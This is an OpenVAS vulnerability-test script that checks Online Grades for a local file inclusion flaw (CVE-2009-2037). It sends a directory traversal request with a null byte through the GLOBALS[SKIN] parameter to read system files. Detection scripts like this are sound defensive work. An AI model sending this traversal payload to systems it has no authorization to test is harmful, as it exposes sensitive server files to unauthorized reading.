###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_online_grades_44399.nasl 8457 2018-01-18 07:58:32Z teissa $
#
# Online Grades Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Online Grades is prone to multiple local file-include vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker with admin access can exploit these vulnerabilities to
obtain potentially sensitive information and to execute arbitrary
local scripts in the context of the webserver process. This may allow
the attacker to compromise the application and the computer; other
attacks are also possible.

Online Grades 3.2.5 and prior are vulnerable.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100875");
 script_version("$Revision: 8457 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-18 08:58:32 +0100 (Thu, 18 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
 script_bugtraq_id(44399);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-2037");

 script_name("Online Grades Multiple Local File Include Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/44399");
 script_xref(name : "URL" , value : "http://www.onlinegrades.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/grades", "/onlinegrades", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach  file (keys(files)) {

    url = string(dir,"/index.php?GLOBALS[SKIN]=",crap(data:"../",length:3*9),files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file,extra_check:make_list("Student Login","Student ID"))) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
